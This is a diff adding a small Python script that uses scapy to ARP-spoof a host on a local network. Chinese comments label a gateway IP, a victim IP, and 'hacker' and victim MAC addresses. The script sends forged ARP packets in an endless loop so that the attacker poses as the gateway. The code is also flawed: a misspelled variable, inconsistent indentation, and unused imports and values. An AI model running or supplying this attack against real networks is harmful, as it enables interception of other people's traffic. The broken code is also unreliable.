@@ -1,0 +1,27 @@
+import socket
+
+from whois import whois
+from scapy.all import *
+from random import random
+def main():
+     getewayIP="192.168.82.2"
+    #网关ip
+    victimIP="192.168.82.156"
+    #受害者ip
+    hackerMAC="00:0c:29:f5:eb:46"
+    #黑客mac
+    victimMAC="00:0c:29:08:17:1c"
+    #受害者mac
+    #print(getmacbyip("192.168.82.170"))
+    #获得mac，op为黑客mac，本质为让黑客假装成为网关
+    packet=Ether()/ARP(psrc=gatewayIP,pdst=victimIP)
+    while 1:
+        sendp(packet)
+        time.sleep(2)
+        print(packet.show())
+
+pass
+
+
+if __name__=='__main__':
+    main()
